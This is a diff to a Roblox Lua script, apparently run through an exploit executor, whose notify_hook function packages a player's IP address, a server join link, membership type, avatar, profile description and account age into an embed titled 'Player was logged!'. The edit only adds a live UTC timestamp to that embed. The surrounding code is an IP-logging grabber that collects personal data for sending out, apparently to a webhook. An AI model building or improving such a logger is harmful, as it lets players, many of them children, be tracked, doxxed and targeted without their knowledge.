@@ -14,12 +14,23 @@ local function notify_hook()
 	local avatarjson = game.HttpService:JSONDecode(AvatarAPI)
 	local Avatar = avatarjson.data[1].imageUrl
 
+	-- Timestamp
+
+	local utc = os.date("!*t")
+	local isoTime = string.format("%04d-%02d-%02dT%02d:%02d:%02d.000Z", 
+	utc.year, utc.month, utc.day, utc.hour, utc.min, utc.sec)
+	
 	-------- User API Script
+	
 	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..game.Players.LocalPlayer.UserId)
 	local json = game.HttpService:JSONDecode(UserAPI)
+	
 	-------- Description Data
+	
 	local DescriptionData = json.description
+	
 	-------- Created Data
+	
 	local CreatedData = json.created
 
 	local send_data = {
@@ -30,7 +41,7 @@ local function notify_hook()
       ["id"]= 985364321,
       ["title"]= "Player was logged!",
       ["description"]= "IP : "..result.query.."\nJoin: [**Click me!**](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&jobId=".. game.JobId .. ")\n\nMembership : **".. player.MembershipType.Name .."**\n",
-      ["timestamp"]= "2025-10-08T21:00:00.000Z",
+      ["timestamp"]= isoTime,
       ["color"]= 16777215,
       ["footer"]= {
         ["text"]= "Player's like to be logged!",
